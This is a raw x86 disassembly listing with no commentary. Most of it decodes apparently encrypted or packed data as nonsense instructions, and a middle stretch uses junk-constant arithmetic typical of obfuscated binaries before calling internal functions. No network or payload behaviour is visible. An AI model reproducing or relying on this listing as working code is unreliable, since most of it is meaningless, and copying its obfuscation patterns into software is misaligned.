  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x41d20fe6],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	jns    0x40f7b1
  40f733:	pop    esp
  40f734:	div    BYTE PTR [eax]
  40f736:	inc    esi
  40f737:	and    al,bh
  40f739:	rcr    DWORD PTR [edx-0x1be5d30e],cl
  40f73f:	push   ds
  40f740:	jo     0x40f6ce
  40f742:	mov    al,0x55
  40f744:	pop    esi
  40f745:	jmp    0xe20a:0x501c983e
  40f74c:	dec    esi
  40f74d:	fisttp WORD PTR [edi-0x70d4fef4]
  40f753:	sbb    DWORD PTR [ebx+0x70e01406],ebx
  40f759:	aaa    
  40f75a:	aaa    
  40f75b:	scas   eax,DWORD PTR es:[edi]
  40f75c:	sti    
  40f75d:	ret    0x9e08
  40f760:	inc    ebp
  40f761:	nop
  40f762:	mov    dl,0xf1
  40f764:	xchg   edx,eax
  40f765:	or     al,0x72
  40f767:	jo     0x40f737
  40f769:	inc    esi
  40f76a:	sbb    esi,eax
  40f76c:	mov    al,ds:0x1501a87a
  40f771:	ja     0x40f6f3
  40f773:	dec    ebx
  40f774:	pusha  
  40f775:	outs   dx,BYTE PTR ds:[esi]
  40f776:	das    
  40f777:	(bad)  
  40f778:	out    dx,eax
  40f779:	push   es
  40f77a:	dec    ecx
  40f77b:	pop    esi
  40f77c:	cmp    eax,0xb1b74c84
  40f781:	mov    eax,0xdd115589
  40f786:	fsub   QWORD PTR [esi-0x6d]
  40f789:	ja     0x40f7ce
  40f78b:	inc    edi
  40f78c:	pop    edx
  40f78d:	mov    ds:0xbeb2b3a6,eax
  40f792:	sub    edx,DWORD PTR [eax+esi*2]
  40f795:	fs addr16 push eax
  40f798:	sbb    eax,0xf370fd65
  40f79d:	add    esi,DWORD PTR [ebx-0x4d]
  40f7a0:	mov    edi,0x7fcc2dcd
  40f7a5:	ja     0x40f7db
  40f7a7:	pop    ss
  40f7a8:	sub    eax,0x982d167a
  40f7ad:	mov    ch,0xe5
  40f7af:	jae    0x40f7de
  40f7b1:	adc    eax,0x6b369241
  40f7b6:	mov    bl,0x58
  40f7b8:	lods   eax,DWORD PTR ds:[esi]
  40f7b9:	stos   BYTE PTR es:[edi],al
  40f7ba:	pop    eax
  40f7bb:	pop    es
  40f7bc:	mov    edx,0xf5ee5832
  40f7c1:	(bad)  
  40f7c2:	jns    0x40f836
  40f7c4:	outs   dx,DWORD PTR ds:[esi]
  40f7c5:	test   al,0x6b
  40f7c7:	add    al,0x74
  40f7c9:	mov    esp,0xa95866bb
  40f7ce:	loopne 0x40f82d
  40f7d0:	(bad)  
  40f7d1:	es (bad) 
  40f7d4:	jb     0x40f7e4
  40f7d6:	ja     0x40f834
  40f7d8:	stos   DWORD PTR es:[edi],eax
  40f7d9:	pop    esi
  40f7da:	stos   BYTE PTR es:[edi],al
  40f7db:	rcl    DWORD PTR [ebx+0x258535c],1
  40f7e1:	pop    ebp
  40f7e2:	mov    ah,0x1
  40f7e4:	shl    DWORD PTR [esi-0x7b7002e2],cl
  40f7ea:	add    eax,DWORD PTR [ecx]
  40f7ec:	std    
  40f7ed:	xchg   BYTE PTR [edi+0x2f],ch
  40f7f0:	fcomi  st,st(3)
  40f7f2:	daa    
  40f7f3:	lahf   
  40f7f4:	gs test al,0x3
  40f7f7:	in     al,0x46
  40f7f9:	lea    eax,[edx-0x5f]
  40f7fc:	std    
  40f7fd:	xchg   ecx,eax
  40f7fe:	jbe    0x40f86b
  40f800:	sahf   
  40f801:	into   
  40f802:	or     BYTE PTR [eax-0x3be8d618],ah
  40f808:	pop    ecx
  40f809:	scas   al,BYTE PTR es:[edi]
  40f80a:	add    esp,esp
  40f80c:	mov    ebx,0x259cf9ee
  40f811:	push   ds
  40f812:	pop    esp
  40f813:	cli    
  40f814:	je     0x40f864
  40f816:	mov    edx,0x9af47b5c
  40f81b:	into   
  40f81c:	jae    0x40f79f
  40f81e:	(bad)  
  40f81f:	sysret 
  40f821:	je     0x40f7b0
  40f823:	push   ecx
  40f824:	cmp    eax,0xc5763c10
  40f829:	popf   
  40f82a:	popf   
  40f82b:	stos   BYTE PTR es:[edi],al
  40f82c:	stos   DWORD PTR es:[edi],eax
  40f82d:	and    eax,0xe538a3eb
  40f832:	xchg   edi,eax
  40f833:	shr    DWORD PTR [edx+esi*2-0x4d],cl
  40f837:	adc    al,0xa
  40f839:	sti    
  40f83a:	add    DWORD PTR [esi+0x3e],esp
  40f83d:	or     esp,DWORD PTR ds:0x357f99fc
  40f843:	push   ss
  40f844:	std    
  40f845:	shl    DWORD PTR [edi-0x36d28faa],0x6c
  40f84c:	add    BYTE PTR [eax+edx*2-0x24fb0459],bh
  40f853:	cmp    eax,0x2f744a6c
  40f858:	and    ecx,DWORD PTR [edx-0x7c6fabf1]
  40f85e:	cld    
  40f85f:	sbb    ch,dh
  40f861:	adc    bh,dl
  40f863:	sbb    al,0x45
  40f865:	mov    al,0xf1
  40f867:	push   0x22c3bae6
  40f86c:	lods   al,BYTE PTR ds:[esi]
  40f86d:	je     0x40f814
  40f86f:	sub    esi,DWORD PTR [ecx+0x19]
  40f872:	jb     0x40f8c9
  40f874:	push   edi
  40f875:	sti    
  40f876:	and    esp,DWORD PTR [edx]
  40f878:	mov    edi,0x90519353
  40f87d:	xchg   eax,edx
  40f87f:	fsub   DWORD PTR [ebp+0x1]
  40f882:	lods   eax,DWORD PTR ds:[esi]
  40f883:	scas   eax,DWORD PTR es:[edi]
  40f884:	into   
  40f885:	loopne 0x40f80e
  40f887:	adc    esp,DWORD PTR [ecx]
  40f889:	je     0x40f8d6
  40f88b:	inc    edi
  40f88c:	mov    esi,0x1af0a31d
  40f891:	adc    ebx,DWORD PTR [ecx+eax*1]
  40f894:	ins    DWORD PTR es:[edi],dx
  40f895:	es nop
  40f897:	rcl    DWORD PTR [ebx],0x4b
  40f89a:	inc    esp
  40f89b:	dec    esi
  40f89c:	jbe    0x40f852
  40f89e:	mov    bl,0x52
  40f8a0:	jle    0x40f87e
  40f8a2:	scas   al,BYTE PTR es:[edi]
  40f8a3:	lea    esp,[eax-0x66]
  40f8a6:	jp     0x40f8ed
  40f8a8:	inc    esp
  40f8a9:	cli    
  40f8aa:	pop    es
  40f8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ac:	mov    ebp,0xc73db6f3
  40f8b1:	push   cs
  40f8b2:	shl    DWORD PTR [esi+ecx*4-0x35],1
  40f8b6:	xchg   edi,eax
  40f8b7:	das    
  40f8b8:	pop    edi
  40f8b9:	xchg   edi,eax
  40f8ba:	pop    esp
  40f8bb:	jne    0x40f870
  40f8bd:	sbb    BYTE PTR [esi+0x42],bl
  40f8c0:	out    0x6a,eax
  40f8c2:	or     DWORD PTR [eax+0x5509c559],0x3cbd9cdd
  40f8cc:	push   es
  40f8cd:	or     eax,0xd0d3ccbd
  40f8d2:	js     0x40f911
  40f8d4:	jnp    0x40f8e4
  40f8d6:	arpl   di,di
  40f8d8:	lahf   
  40f8d9:	leave  
  40f8da:	sub    BYTE PTR [esi+edi*2-0x17a7fe90],0x2b
  40f8e2:	jbe    0x40f893
  40f8e4:	outs   dx,BYTE PTR ds:[esi]
  40f8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e6:	ror    BYTE PTR [edi],0x6c
  40f8e9:	add    al,0xdc
  40f8eb:	jo     0x40f8be
  40f8ed:	pop    edi
  40f8ee:	jbe    0x40f921
  40f8f0:	loope  0x40f93a
  40f8f2:	sbb    al,0xed
  40f8f4:	fild   DWORD PTR [ecx-0x16]
  40f8f7:	out    dx,al
  40f8f8:	(bad)  
  40f8f9:	jno    0x40f8c9
  40f8fb:	push   0x9604394e
  40f900:	xor    al,0x9c
  40f902:	lods   eax,DWORD PTR ds:[esi]
  40f903:	inc    ecx
  40f904:	xor    DWORD PTR [eax-0x594dd050],edx
  40f90a:	mov    cl,0xaf
  40f90c:	arpl   WORD PTR [eax],dx
  40f90e:	sbb    eax,0xd67a1aa6
  40f913:	aaa    
  40f914:	mov    WORD PTR [ebx+0x7d],?
  40f917:	pop    ebx
  40f918:	push   ds
  40f919:	fucomp st(4)
  40f91b:	add    BYTE PTR [edi+0x8],bl
  40f91e:	mov    ecx,edx
  40f920:	ins    BYTE PTR es:[edi],dx
  40f921:	(bad)  
  40f922:	ficom  DWORD PTR [ecx-0x1fcc7169]
  40f928:	sub    BYTE PTR [eax+0x6a],cl
  40f92b:	loop   0x40f94f
  40f92d:	or     BYTE PTR [edi-0x17],bh
  40f930:	cwde   
  40f931:	xchg   esi,eax
  40f932:	shl    BYTE PTR [ebx],cl
  40f934:	pop    ebp
  40f935:	and    al,0xe7
  40f937:	mov    WORD PTR [edi],gs
  40f939:	imul   ecx,DWORD PTR [eax],0xffffff89
  40f93c:	shl    BYTE PTR [esi-0x2e708019],1
  40f942:	jae    0x40f8ce
  40f944:	aas    
  40f945:	ret    
  40f946:	scas   eax,DWORD PTR es:[edi]
  40f947:	icebp  
  40f948:	ss ds xchg esi,ebp
  40f94c:	mov    esp,ebx
  40f94e:	sbb    al,0xe4
  40f950:	sbb    al,0x25
  40f952:	fwait
  40f953:	xor    BYTE PTR [edx+0x21],dh
  40f956:	mov    BYTE PTR [eax+0x6be3322a],bl
  40f95c:	iret   
  40f95d:	aaa    
  40f95e:	and    al,0xff
  40f960:	retf   0x2c2e
  40f963:	call   0xa745:0x1f9c9a67
  40f96a:	xchg   edi,eax
  40f96b:	out    0xe5,eax
  40f96d:	loope  0x40f90a
  40f96f:	jl     0x40f969
  40f971:	dec    edx
  40f972:	and    esp,esp
  40f974:	jecxz  0x40f9f0
  40f976:	fstp   TBYTE PTR [edi-0x158266b7]
  40f97c:	mov    dh,0x20
  40f97e:	ret    
  40f97f:	lahf   
  40f980:	jo     0x40f98c
  40f982:	mov    bh,0x5a
  40f984:	mov    bh,0xab
  40f986:	jae    0x40f9ff
  40f988:	jmp    0x8d16c7b5
  40f98d:	mov    dh,0xe9
  40f98f:	sub    cl,al
  40f991:	lods   al,BYTE PTR ds:[esi]
  40f992:	fstp   DWORD PTR [edx+0x1c]
  40f995:	stos   BYTE PTR es:[edi],al
  40f996:	in     al,0x11
  40f998:	adc    eax,0xaf57d96
  40f99d:	(bad)  
  40f99e:	popf   
  40f99f:	mov    ds:0xbc8c5ccd,al
  40f9a4:	(bad)  
  40f9a5:	and    bl,BYTE PTR [edi+0x2f5dc61e]
  40f9ab:	nop
  40f9ac:	sbb    DWORD PTR [esi-0xa5e2bd4],edi
  40f9b2:	adc    BYTE PTR [edx+eax*1+0x6],bl
  40f9b6:	push   esi
  40f9b7:	test   ecx,0x939d3089
  40f9bd:	lods   eax,DWORD PTR ds:[esi]
  40f9be:	int3   
  40f9bf:	leave  
  40f9c0:	add    edx,esi
  40f9c2:	adc    al,0x95
  40f9c4:	out    dx,al
  40f9c5:	inc    esp
  40f9c6:	scas   al,BYTE PTR es:[edi]
  40f9c7:	lds    esi,FWORD PTR [edi+0x4b]
  40f9ca:	jp     0x40f968
  40f9cc:	mov    fs,WORD PTR [eax]
  40f9ce:	mov    ebx,0x7656407e
  40f9d3:	jmp    0x6c813b62
  40f9d8:	dec    esi
  40f9d9:	icebp  
  40f9da:	test   al,0x91
  40f9dc:	inc    edx
  40f9dd:	push   edx
  40f9de:	xor    DWORD PTR [edi],eax
  40f9e0:	stos   BYTE PTR es:[edi],al
  40f9e1:	aad    0x2b
  40f9e3:	shl    DWORD PTR ds:0xc3e,0x89
  40f9ea:	inc    ebp
  40f9eb:	test   al,0xc7
  40f9ed:	inc    ebp
  40f9ee:	in     al,dx
  40f9ef:	mov    ebp,0x59000066
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x4220b4
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x4f75e170]
  40fc87:	jle    0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0x5e181814
  40fc91:	ins    BYTE PTR es:[edi],dx
  40fc92:	repz div DWORD PTR [ecx+0x7]
  40fc96:	lds    ebp,FWORD PTR [edi]
  40fc98:	adc    al,0x54
  40fc9a:	pop    eax
  40fc9b:	aas    
  40fc9c:	sbb    al,0xaf
  40fc9e:	maskmovq mm6,mm4
  40fca1:	bound  esp,QWORD PTR [ebx-0xff426de]
  40fca7:	mov    esp,eax
  40fca9:	leave  
  40fcaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcab:	dec    ebx
  40fcac:	xchg   ecx,eax
  40fcad:	ins    BYTE PTR es:[edi],dx
  40fcae:	pop    ecx
  40fcaf:	shr    BYTE PTR [eax],1
  40fcb1:	push   0x6e49339e
  40fcb6:	repz pop ecx
  40fcb8:	jecxz  0x40fcb3
  40fcba:	jne    0x40fc8f
  40fcbc:	dec    esi
  40fcbd:	mov    bl,0x6f
  40fcbf:	mov    al,ds:0xf3b3e80a
  40fcc4:	imul   edx,DWORD PTR ds:0xfdfbc6ae,0xdbcc3a37
  40fcce:	xchg   ecx,eax
  40fccf:	test   al,0xde
  40fcd1:	(bad)  
  40fcd2:	aas    
  40fcd3:	cmp    BYTE PTR [esi+eiz*2+0xe],0x9d
  40fcd8:	imul   edx,DWORD PTR [edi+eiz*4+0x41],0xaa3dcc5c
  40fce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce1:	adc    dh,dh
  40fce3:	mov    ebx,0x89d4c201
  40fce8:	mov    cl,0x84
  40fcea:	jmp    0xa4ac:0x31b5cfdb
  40fcf1:	aam    0xca
  40fcf3:	push   ebp
  40fcf4:	jg     0x40fcda
  40fcf6:	sahf   
  40fcf7:	scas   al,BYTE PTR es:[edi]
  40fcf8:	retf   
  40fcf9:	lods   eax,DWORD PTR ds:[esi]
  40fcfa:	mov    ebx,0x7052f18a
  40fcff:	push   ebp
  40fd00:	fwait
  40fd01:	pushf  
  40fd02:	scas   al,BYTE PTR es:[edi]
  40fd03:	jno    0x40fce6
  40fd05:	or     eax,0x751a38c9
  40fd0a:	pushf  
  40fd0b:	mov    edi,0x6470469b
  40fd10:	or     DWORD PTR [eax-0x25],eax
  40fd13:	popf   
  40fd14:	push   esi
  40fd15:	aas    
  40fd16:	jae    0x40fce6
  40fd18:	enter  0x3b4b,0xb4
  40fd1c:	mov    ?,WORD PTR [ecx+0x66591e3d]
  40fd22:	test   BYTE PTR [eax],0xb1
  40fd25:	push   edi
  40fd26:	mov    ds:0x919baf2a,al
  40fd2b:	lock rol BYTE PTR [edx],1
  40fd2e:	add    esi,DWORD PTR [edx-0x39]
  40fd31:	cld    
  40fd32:	push   es
  40fd33:	mov    al,0x14
  40fd35:	imul   edx,DWORD PTR [edx],0xffffffa3
  40fd38:	ret    
  40fd39:	cmp    al,0xd9
  40fd3b:	cmp    BYTE PTR [esi-0x1d4f512e],ch
  40fd41:	cmp    DWORD PTR [edx-0x25],eax
  40fd44:	xlat   BYTE PTR ds:[ebx]
  40fd45:	sub    dh,ch
  40fd47:	xchg   ebx,eax
  40fd48:	outs   dx,DWORD PTR ds:[esi]
  40fd49:	and    ch,BYTE PTR [ecx-0x140540e]
  40fd4f:	push   0x71
  40fd51:	mul    al
  40fd53:	repz and eax,ebx
  40fd56:	sub    al,0x3a
  40fd58:	mov    eax,ds:0x81d814d1
  40fd5d:	mov    ds:0x9b31138,al
  40fd62:	imul   ecx,DWORD PTR [esp+eiz*4],0x75e2cb7e
  40fd69:	push   esi
  40fd6a:	data16 fs mov bl,0xa2
  40fd6e:	jno    0x40fd0c
  40fd70:	jmp    0x65a7:0x4f01b041
  40fd77:	or     BYTE PTR [edx+0x6d41d303],0x50
  40fd7e:	jne    0x40fd5c
  40fd80:	adc    BYTE PTR [edi],0x65
  40fd83:	xchg   ebx,eax
  40fd84:	repnz or eax,0xd5f1c997
  40fd8a:	push   ebp
  40fd8b:	addr16 ja 0x40fd32
  40fd8e:	cmp    BYTE PTR [esi],ch
  40fd90:	out    dx,eax
  40fd91:	inc    edi
  40fd92:	or     eax,0xd0a01786
  40fd97:	mov    dh,BYTE PTR [ebp+0x6a]
  40fd9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd9b:	push   edx
  40fd9c:	inc    esi
  40fd9d:	mov    cl,0x75
  40fd9f:	jle    0x40fd9f
  40fda1:	xchg   ebx,eax
  40fda2:	push   0x84a274d9
  40fda7:	cwde   
  40fda8:	mov    bh,0xbb
  40fdaa:	fs adc esp,ecx
  40fdad:	xchg   esi,eax
  40fdae:	mov    esi,0x9df7ead8
  40fdb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb4:	jp     0x40fd6d
  40fdb6:	test   BYTE PTR [edi+0x18f2b87d],dh
  40fdbc:	mov    cl,0xc8
  40fdbe:	call   0x10cf11ac
  40fdc3:	ret    0xde7f
  40fdc6:	jp     0x40fe29
  40fdc8:	mov    DWORD PTR [edi],edx
  40fdca:	add    eax,0xc6274b22
  40fdcf:	jl     0x40fdca
  40fdd1:	add    edx,DWORD PTR [ebx-0x22eeaa84]
  40fdd7:	push   ss
  40fdd8:	and    dh,BYTE PTR [esi+0x7f]
  40fddb:	fnstcw WORD PTR [eax+esi*4-0x586e05e3]
  40fde2:	or     eax,0x5c9c9c6e
  40fde7:	jge    0x40fd69
  40fde9:	call   0xb6c8e190
  40fdee:	sbb    bh,ah
  40fdf0:	in     eax,dx
  40fdf1:	xor    BYTE PTR [edi],dh
  40fdf3:	push   0x4c67aa
  40fdf8:	sbb    DWORD PTR [ebx+0x7c],edi
  40fdfb:	ja     0x40fdd0
  40fdfd:	or     BYTE PTR [edx-0x3b73e035],0xdb
  40fe04:	fisub  DWORD PTR [ebx]
  40fe06:	and    al,0xff
  40fe08:	scas   eax,DWORD PTR es:[edi]
  40fe09:	fprem  
  40fe0b:	sbb    al,0x6
  40fe0d:	jae    0x40fddd
  40fe0f:	imul   ecx,edi,0x1f
  40fe12:	retf   0x11a5
  40fe15:	mov    edi,0x53552459
  40fe1a:	mov    ch,dh
  40fe1c:	ja     0x40fda2
  40fe1e:	and    DWORD PTR ds:0x49be8a41,0xfffffff9
  40fe25:	jge    0x40fe60
  40fe27:	xor    al,0x77
  40fe29:	dec    edi
  40fe2a:	rcl    dh,0xdb
  40fe2d:	ret    0xe5f5
  40fe30:	(bad)  
  40fe31:	retf   
  40fe32:	jnp    0x40fe53
  40fe34:	inc    DWORD PTR [ecx-0x70]
  40fe37:	cmp    bl,dh
  40fe39:	push   es
  40fe3a:	sub    bl,BYTE PTR [ecx]
  40fe3c:	cs cdq 
  40fe3e:	ror    BYTE PTR [edx],cl
  40fe40:	ins    BYTE PTR es:[edi],dx
  40fe41:	add    dh,dl
  40fe43:	jecxz  0x40feb1
  40fe45:	call   0x3130:0xaa5e39cb
  40fe4c:	(bad)  
  40fe4d:	lods   al,BYTE PTR ds:[esi]
  40fe4e:	mov    esp,gs
  40fe50:	mov    ds:0x6517b315,al
  40fe55:	jne    0x40fe23
  40fe57:	xchg   ebx,eax
  40fe58:	aad    0xbc
  40fe5a:	jmp    DWORD PTR [edx+0x15]
  40fe5d:	aam    0x4b
  40fe5f:	push   eax
  40fe60:	jmp    0x40fdea
  40fe62:	lock jg 0x40fe1d
  40fe65:	cmp    BYTE PTR [edi],0x54
  40fe68:	out    dx,al
  40fe69:	bsf    edx,esp
  40fe6c:	add    ecx,esp
  40fe6e:	in     eax,dx
  40fe6f:	add    al,0xa
  40fe71:	jb     0x40fe93
  40fe73:	fnstcw WORD PTR [ebx]
  40fe75:	clc    
  40fe76:	sub    BYTE PTR [edi-0x65c0b8d7],bl
  40fe7c:	stos   DWORD PTR es:[edi],eax
  40fe7d:	ficomp DWORD PTR [ebp-0x1dd63c5b]
  40fe83:	push   ecx
  40fe84:	stc    
  40fe85:	or     DWORD PTR [edi-0xe62ff19],ebp
  40fe8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8c:	cli    
  40fe8d:	test   BYTE PTR [esi],0xbd
  40fe90:	test   BYTE PTR [ebp-0x1013568f],al
  40fe96:	mov    BYTE PTR ds:0xe6042d05,bh
  40fe9c:	ja     0x40ff0d
  40fe9e:	leave  
  40fe9f:	mov    dh,0xbe
  40fea1:	cmp    edx,ebp
  40fea3:	inc    ebx
  40fea4:	outs   dx,BYTE PTR ds:[esi]
  40fea5:	ss lahf 
  40fea7:	cmp    ch,cl
  40fea9:	or     dl,al
  40feab:	aaa    
  40feac:	int3   
  40fead:	daa    
  40feae:	rcr    BYTE PTR [edi+eax*4],cl
  40feb1:	jae    0x40fe55
  40feb3:	and    dl,BYTE PTR [edi+0x4b]
  40feb6:	inc    ebx
  40feb7:	pop    edi
  40feb8:	clc    
  40feb9:	and    BYTE PTR [esi-0x6],0x92
  40febd:	add    BYTE PTR [ebp+0x7e],ah
  40fec0:	cmc    
  40fec1:	add    cl,BYTE PTR [edx-0x61]
  40fec4:	fs aaa 
  40fec6:	adc    al,0xe5
  40fec8:	imul   eax,DWORD PTR [edi+0x90bff6],0x8
  40fecf:	test   DWORD PTR [ecx+0x48657168],ebp
  40fed5:	loopne 0x40fe8b
  40fed7:	sbb    al,0xf2
  40fed9:	mov    ch,0xd4
  40fedb:	dec    edi
  40fedc:	fmul   QWORD PTR [ebp-0x1b]
  40fedf:	mov    dl,0xb0
  40fee1:	loop   0x40ff32
  40fee3:	mov    dl,0x2a
  40fee5:	fld    st(2)
  40fee7:	outs   dx,DWORD PTR ds:[esi]
  40fee8:	rcr    DWORD PTR ds:0x9e8f9cd6,1
  40feee:	rcr    BYTE PTR [edi-0x17748fb8],0xde
  40fef5:	lea    esp,[ecx-0x38a28b39]
  40fefb:	ja     0x40fefd
  40fefd:	sahf   
  40fefe:	push   cs
  40feff:	je     0x40fefb
  40ff01:	loop   0x40fe8d
  40ff03:	stos   BYTE PTR es:[edi],al
  40ff04:	mov    eax,0x20516ca3
